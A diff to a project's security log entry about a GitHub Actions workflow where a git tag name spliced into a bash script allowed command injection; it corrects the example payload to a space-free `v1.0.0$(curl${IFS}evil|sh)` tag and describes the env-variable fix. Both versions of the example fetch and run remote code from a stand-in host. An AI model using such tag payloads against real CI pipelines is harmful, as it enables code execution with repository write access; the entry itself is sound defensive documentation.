@@ -61,12 +61,20 @@ from so a reader can check it.
   expression into the YAML text *before* bash parses it, so the surrounding double
   quotes gave no protection, and a git tag name may legally contain `$()`, backticks,
   `;` and `"` (git only forbids space, `~^:?*[\`, control characters and a few
-  structural sequences). A tag matching this workflow's `v*` trigger, such as
-  `v1.0.0$(curl attacker|bash)`, would have had its command substitution executed by
-  bash on the `windows-latest` runner, with write access to the repository. Found
-  independently by `claude[bot]`'s automated review of PR #233 and confirmed by the
-  cloud reviewer routine, which reproduced the exploitable ref shape with `git
-  check-ref-format --allow-onelevel`. Fixed by passing `ref_name`/`repository` through
+  structural sequences — a literal space is the one that matters here). A tag
+  matching this workflow's `v*` trigger, such as `v1.0.0$(curl${IFS}evil|sh)` (`${IFS}`
+  standing in for the literal space git's own ref-name rule forbids), would have had
+  its command substitution executed by bash on the `windows-latest` runner, with
+  write access to the repository. Found independently by `claude[bot]`'s automated
+  review of PR #233 and confirmed by the cloud reviewer routine, which validated the
+  general shape (`$()`/backtick/`;` refs without spaces) against `git
+  check-ref-format --allow-onelevel`. **Correction (this entry, rule 9):** an earlier
+  revision of this sentence and of `release.yml`'s own comment illustrated the exploit
+  with `v1.0.0$(curl attacker|bash)`, which contains a literal space and is
+  therefore rejected by `git check-ref-format --allow-onelevel` — not the string
+  either reviewer actually validated. Found by a later `claude[bot]` pass on this
+  same PR; the vulnerability and the fix below were never in question, only this one
+  illustrative example. Fixed by passing `ref_name`/`repository` through
   `env:` (`TAG_NAME`/`REPO`) and referencing the shell variables instead of the
   template expressions — a variable's value is never re-parsed as shell syntax, unlike
   text spliced into the script before bash sees it. **Failure mode (rule 10):** the
